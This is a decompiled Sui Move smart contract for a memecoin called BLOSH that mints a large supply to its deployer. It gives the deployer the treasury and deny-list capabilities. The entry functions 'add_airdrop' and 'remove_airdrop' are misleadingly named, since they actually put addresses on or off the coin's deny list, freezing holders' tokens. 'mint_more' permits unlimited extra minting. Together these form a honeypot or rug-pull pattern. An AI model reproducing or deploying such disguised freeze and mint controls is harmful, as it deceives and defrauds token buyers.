module 0xd671ff64b422fadab1bd8cdbb412032b5b5729922e601b83ffc2bafc5674365e::BLOSH {
    struct BLOSH has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLOSH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BLOSH>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: BLOSH, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BLOSH>(arg0, 6, b"BLOSH", b"Blosh", b"blosh the rizz fish", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmaUwuicicpoJS4PpsB19oCCyVdM5hvFLdGxgSEUy1yr3N?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BLOSH>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<BLOSH>>(0x2::coin::mint<BLOSH>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<BLOSH>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BLOSH>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<BLOSH>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<BLOSH>>(0x2::coin::mint<BLOSH>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLOSH>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BLOSH>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

